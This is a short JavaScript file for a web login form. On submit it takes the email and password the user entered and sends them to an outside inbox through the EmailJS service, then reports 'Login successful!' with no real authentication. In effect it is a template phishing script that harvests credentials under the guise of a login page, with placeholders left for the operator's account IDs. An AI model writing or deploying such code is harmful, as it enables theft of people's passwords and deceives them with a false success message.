// Initialize EmailJS
(function() {
    emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
})();

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Send email using EmailJS
    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        email: email,
        password: password
    })
    .then(function(response) {
        document.getElementById('message').innerText = "Login successful!";
        console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
        document.getElementById('message').innerText = "Login failed. Please try again.";
        console.log('FAILED...', error);
    });
});
